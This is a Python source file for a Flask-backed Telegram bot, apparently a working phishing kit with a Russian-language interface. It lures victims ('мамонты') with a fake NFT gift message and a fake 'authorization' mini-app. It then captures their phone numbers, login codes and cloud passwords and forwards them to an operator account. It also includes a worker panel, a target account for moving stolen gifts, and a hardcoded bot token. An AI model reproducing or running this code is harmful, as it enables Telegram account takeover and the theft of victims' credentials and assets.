import os
import logging
from flask import Flask, send_from_directory, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import sqlite3
import datetime
import re
import asyncio
import threading
import time

# Настройка Flask
app = Flask(__name__)

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = os.getenv('BOT_TOKEN', '7638076310:AAHL2G37wOaOmZNjS65sffUkQuz44xvHyJ8')
WEB_APP_URL = os.getenv('RENDER_EXTERNAL_URL', '') + '/gift_webapp.html'

# Глобальная переменная для бота
bot_app = None

# ========== FLASK ROUTES ==========

@app.route('/')
def index():
    return "🎁 Telegram Gift Bot is running! Use /start in Telegram"

@app.route('/gift_webapp.html')
def gift_webapp():
    return send_from_directory('.', 'gift_webapp.html')

@app.route('/api/auth', methods=['POST'])
def handle_auth():
    data = request.json
    logger.info(f"Auth data received: {data}")
    return jsonify({"status": "success"})

@app.route('/health')
def health():
    return jsonify({"status": "ok", "bot_running": bot_app is not None})

# ========== TELEGRAM BOT FUNCTIONS ==========

def init_db():
    try:
        conn = sqlite3.connect('gift_monitor.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS gifts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                gift_url TEXT NOT NULL,
                gift_name TEXT NOT NULL,
                phone_number TEXT,
                code TEXT,
                cloud_password TEXT,
                worker_id TEXT,
                status TEXT DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS actions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                gift_id INTEGER,
                action_type TEXT NOT NULL,
                action_data TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (gift_id) REFERENCES gifts (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS workers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                worker_id TEXT UNIQUE NOT NULL,
                worker_name TEXT,
                is_active BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                id INTEGER PRIMARY KEY CHECK (id = 1),
                target_account TEXT DEFAULT '6038457276',
                min_stars REAL DEFAULT 10.0
            )
        ''')
        
        cursor.execute('INSERT OR IGNORE INTO settings (id) VALUES (1)')
        conn.commit()
        conn.close()
        logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"❌ Database init error: {e}")

def add_default_workers():
    try:
        conn = sqlite3.connect('gift_monitor.db')
        cursor = conn.cursor()
        
        workers = [
            ("6038457276", "KA_RL_WOrk"),
            ("123456789", "Worker_1"),
        ]
        
        for worker_id, worker_name in workers:
            cursor.execute(
                'INSERT OR IGNORE INTO workers (worker_id, worker_name) VALUES (?, ?)',
                (worker_id, worker_name)
            )
        
        conn.commit()
        conn.close()
        logger.info("✅ Default workers added")
    except Exception as e:
        logger.error(f"❌ Error adding workers: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    try:
        conn = sqlite3.connect('gift_monitor.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM workers WHERE worker_id = ?', (user_id,))
        worker = cursor.fetchone()
        conn.close()
        
        if worker:
            keyboard = [
                [InlineKeyboardButton("➕ Добавить подарок", callback_data="add_gift")],
                [InlineKeyboardButton("📊 Моя статистика", callback_data="my_stats")],
                [InlineKeyboardButton("📋 Активные подарки", callback_data="active_gifts")]
            ]
            
            if user_id == "6038457276":
                keyboard.append([InlineKeyboardButton("👨‍💻 Админ панель", callback_data="admin_panel")])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "🎁 **Панель воркера**\n\nВыберите действие:",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "🎁 **Вам подарили подарок!**\n\n"
                "*JollyChimp-3809*\n\n"
                "Учтите, что подарок можно принять только с аккаунта, на который был отправлен данный подарок. "
                "Ссылка действительна 60 минут с момента получения.\n\n"
                "*Открывая это мини-приложение, Вы принимаете Условия использования мини-приложений.*",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton(
                        "🎁 ПОКАЗАТЬ ПОДАРОК", 
                        web_app={"url": WEB_APP_URL}
                    )
                ], [
                    InlineKeyboardButton("❌ Отмена", callback_data="cancel_gift")
                ]]),
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        await update.message.reply_text("❌ Произошла ошибка. Попробуйте позже.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = str(query.from_user.id)
    
    if data == "add_gift":
        await add_gift_handler(query, context)
    elif data == "show_gift":
        await show_gift_handler(query, context)
    elif data == "admin_panel":
        await admin_panel_handler(query, context)
    elif data == "my_stats":
        await my_stats_handler(query, context)
    elif data == "active_gifts":
        await active_gifts_handler(query, context)
    elif data == "cancel_gift":
        await cancel_gift_handler(query, context)
    elif data.startswith("gift_"):
        await gift_details_handler(query, context, data)
    elif data == "back_to_admin":
        await admin_panel_handler(query, context)
    elif data == "back_to_main":
        await start_callback(query, context)

async def start_callback(query, context):
    user_id = str(query.from_user.id)
    
    conn = sqlite3.connect('gift_monitor.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM workers WHERE worker_id = ?', (user_id,))
    worker = cursor.fetchone()
    conn.close()
    
    if worker:
        keyboard = [
            [InlineKeyboardButton("➕ Добавить подарок", callback_data="add_gift")],
            [InlineKeyboardButton("📊 Моя статистика", callback_data="my_stats")],
            [InlineKeyboardButton("📋 Активные подарки", callback_data="active_gifts")]
        ]
        
        if user_id == "6038457276":
            keyboard.append([InlineKeyboardButton("👨‍💻 Админ панель", callback_data="admin_panel")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🎁 **Панель воркера**\n\nВыберите действие:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    else:
        await query.edit_message_text(
            "🎁 **Вам подарили подарок!**\n\n"
            "*JollyChimp-3809*\n\n"
            "Учтите, что подарок можно принять только с аккаунта, на который был отправлен данный подарок. "
            "Ссылка действительна 60 минут с момента получения.\n\n"
            "*Открывая это мини-приложение, Вы принимаете Условия использования мини-приложений.*",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(
                    "🎁 ПОКАЗАТЬ ПОДАРОК", 
                    web_app={"url": WEB_APP_URL}
                )
            ], [
                InlineKeyboardButton("❌ Отмена", callback_data="cancel_gift")
            ]]),
            parse_mode='Markdown'
        )

async def cancel_gift_handler(query, context):
    await query.edit_message_text(
        "❌ Получение подарка отменено.",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Начать заново", callback_data="back_to_main")
        ]])
    )

async def show_gift_handler(query, context):
    await query.edit_message_text(
        "🎁 *Jolly Chimp #3809*\n\n"
        "Для получения подарка требуется авторизация в мини-приложении.",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton(
                "🔐 Авторизация", 
                web_app={"url": WEB_APP_URL}
            )
        ], [
            InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")
        ]]),
        parse_mode='Markdown'
    )

async def add_gift_handler(query, context):
    await query.edit_message_text(
        "📝 **Добавление подарка**\n\n"
        "Отправьте ссылку на подарок в формате:\n"
        "`https://t.me/nft/CloverPin-23499`\n\n"
        "Или отправьте 'отмена' для возврата.",
        parse_mode='Markdown'
    )
    
    context.user_data['waiting_for_gift'] = True

async def admin_panel_handler(query, context):
    conn = sqlite3.connect('gift_monitor.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT target_account, min_stars FROM settings WHERE id = 1')
    settings = cursor.fetchone()
    target_account, min_stars = settings
    
    cursor.execute('SELECT COUNT(*) FROM gifts')
    total_gifts = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM gifts WHERE status = "active"')
    active_gifts = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM workers WHERE is_active = 1')
    active_workers = cursor.fetchone()[0]
    
    conn.close()
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("🎯 Изменить target", callback_data="change_target")],
        [InlineKeyboardButton("⭐ Изменить звезды", callback_data="change_stars")],
        [InlineKeyboardButton("👥 Управление воркерами", callback_data="manage_workers")],
        [InlineKeyboardButton("📋 Список подарков", callback_data="gifts_list")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"👨‍💻 **Админ панель**\n\n"
        f"🎯 Куда отправляем подарки (target):\n"
        f"`{target_account}`\n\n"
        f"⭐ Звезд для перевода: `{min_stars}`\n\n"
        f"📊 Статистика:\n"
        f"• Подарков: {total_gifts}\n"
        f"• Активных: {active_gifts}\n"
        f"• Воркеров: {active_workers}",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text
    
    if context.user_data.get('waiting_for_gift'):
        await handle_gift_addition(update, context, text, user_id)
    else:
        await handle_mammoth_actions(update, context, text, user_id)

async def handle_gift_addition(update, context, text, user_id):
    if text.lower() == 'отмена':
        context.user_data['waiting_for_gift'] = False
        await update.message.reply_text("❌ Добавление отменено")
        return
    
    gift_match = re.match(r'https://t\.me/nft/([A-Za-z0-9-]+)', text)
    if gift_match:
        gift_name = gift_match.group(1)
        gift_url = text
        
        conn = sqlite3.connect('gift_monitor.db')
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO gifts (gift_url, gift_name, worker_id) VALUES (?, ?, ?)',
            (gift_url, gift_name, user_id)
        )
        gift_id = cursor.lastrowid
        
        cursor.execute(
            'INSERT INTO actions (gift_id, action_type, action_data) VALUES (?, ?, ?)',
            (gift_id, 'gift_added', f'Подарок добавлен воркером {user_id}')
        )
        
        conn.commit()
        conn.close()
        
        context.user_data['waiting_for_gift'] = False
        
        try:
            await context.bot.send_message(
                "6038457276",
                f"🎁 **Новый подарок добавлен**\n\n"
                f"Подарок: {gift_name}\n"
                f"Ссылка: {gift_url}\n"
                f"Воркер: {user_id}\n"
                f"Время: {datetime.datetime.now().strftime('%H:%M')}",
                parse_mode='Markdown'
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **Подарок добавлен!**\n\n🎁 {gift_name}\n🔗 {gift_url}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ Неверный формат ссылки. Попробуйте еще раз или отправьте 'отмена'")

async def handle_mammoth_actions(update, context, text, user_id):
    if re.search(r'(73099|облачный|пароль|код|\+7|телефон)', text, re.IGNORECASE):
        conn = sqlite3.connect('gift_monitor.db')
        cursor = conn.cursor()
        
        cursor.execute('SELECT id FROM gifts WHERE status = "active" ORDER BY id DESC LIMIT 1')
        gift = cursor.fetchone()
        
        if gift:
            gift_id = gift[0]
            action_type = "unknown"
            
            if re.search(r'\d{5}', text):
                action_type = "code_entered"
            elif re.search(r'облачный', text, re.IGNORECASE):
                action_type = "cloud_password_requested"
            elif re.search(r'пароль', text, re.IGNORECASE):
                action_type = "password_entered"
            elif re.search(r'\+7|\+1|телефон', text, re.IGNORECASE):
                action_type = "phone_entered"
            
            cursor.execute(
                'INSERT INTO actions (gift_id, action_type, action_data) VALUES (?, ?, ?)',
                (gift_id, action_type, text)
            )
            conn.commit()
            
            try:
                action_desc = {
                    "code_entered": "ввел код",
                    "cloud_password_requested": "запросил облачный пароль", 
                    "password_entered": "ввел пароль",
                    "phone_entered": "ввел номер телефона"
                }.get(action_type, "выполнил действие")
                
                await context.bot.send_message(
                    "6038457276",
                    f"📌 **Мамонт**\n\n{action_desc}:\n`{text}`\n"
                    f"Время: {datetime.datetime.now().strftime('%H:%M')}",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        conn.close()

async def my_stats_handler(query, context):
    user_id = str(query.from_user.id)
    
    conn = sqlite3.connect('gift_monitor.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT COUNT(*) FROM gifts WHERE worker_id = ?', (user_id,))
    my_gifts = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM gifts WHERE worker_id = ? AND status = "completed"', (user_id,))
    completed_gifts = cursor.fetchone()[0]
    
    conn.close()
    
    await query.edit_message_text(
        f"📊 **Моя статистика**\n\n👤 ID: `{user_id}`\n"
        f"🎁 Всего подарков: {my_gifts}\n✅ Завершено: {completed_gifts}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")
        ]])
    )

async def active_gifts_handler(query, context):
    user_id = str(query.from_user.id)
    
    conn = sqlite3.connect('gift_monitor.db')
    cursor = conn.cursor()
    
    cursor.execute(
        'SELECT id, gift_name, gift_url FROM gifts WHERE worker_id = ? AND status = "active" ORDER BY id DESC LIMIT 10',
        (user_id,)
    )
    active_gifts = cursor.fetchall()
    conn.close()
    
    if not active_gifts:
        await query.edit_message_text(
            "📋 **Активные подарки**\n\nНет активных подарков",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")
            ]])
        )
        return
    
    keyboard = []
    for gift in active_gifts:
        gift_id, gift_name, gift_url = gift
        keyboard.append([InlineKeyboardButton(f"🎁 {gift_name}", callback_data=f"gift_{gift_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")])
    
    await query.edit_message_text(
        "📋 **Активные подарки**\n\nВыберите подарок:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def gift_details_handler(query, context, data):
    gift_id = data.split('_')[1]
    
    conn = sqlite3.connect('gift_monitor.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT gift_name, gift_url, status FROM gifts WHERE id = ?', (gift_id,))
    gift = cursor.fetchone()
    
    cursor.execute('SELECT action_type, action_data, timestamp FROM actions WHERE gift_id = ? ORDER BY timestamp', (gift_id,))
    actions = cursor.fetchall()
    
    conn.close()
    
    if not gift:
        await query.edit_message_text("❌ Подарок не найден")
        return
    
    gift_name, gift_url, status = gift
    
    actions_text = "📝 **Действия мамонта:**\n"
    for action in actions:
        action_type, action_data, timestamp = action
        time_str = timestamp.split(' ')[1][:5] if ' ' in timestamp else timestamp
        actions_text += f"• {time_str} - {action_type}: {action_data}\n"
    
    await query.edit_message_text(
        f"🎁 **Детали подарка**\n\n"
        f"Название: {gift_name}\n"
        f"Ссылка: {gift_url}\n"
        f"Статус: {status}\n\n{actions_text}",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔙 Назад", callback_data="active_gifts")
        ]]),
        parse_mode='Markdown'
    )

# ========== BOT SETUP ==========

def setup_bot():
    global bot_app
    try:
        # Инициализация БД
        init_db()
        add_default_workers()
        
        # Создание приложения бота
        bot_app = Application.builder().token(BOT_TOKEN).build()
        
        # Обработчики
        bot_app.add_handler(CommandHandler("start", start))
        bot_app.add_handler(CallbackQueryHandler(button_handler))
        bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
        
        logger.info("✅ Bot setup completed")
        return bot_app
    except Exception as e:
        logger.error(f"❌ Bot setup failed: {e}")
        return None

async def run_bot_polling():
    """Запуск бота с опросом"""
    try:
        application = setup_bot()
        if application:
            logger.info("🤖 Starting bot polling...")
            await application.run_polling()
        else:
            logger.error("❌ Failed to setup bot")
    except Exception as e:
        logger.error(f"❌ Bot polling error: {e}")

def run_bot():
    """Запуск бота в отдельном потоке"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bot_polling())
    except Exception as e:
        logger.error(f"❌ Bot thread error: {e}")

# ========== START APPLICATION ==========

def start_services():
    """Запуск всех сервисов"""
    logger.info("🚀 Starting services...")
    
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    logger.info("✅ Bot thread started")
    
    # Ждем немного перед запуском Flask
    time.sleep(3)
    
    # Запускаем Flask сервер
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"🌐 Starting Flask server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

if __name__ == '__main__':
    start_services()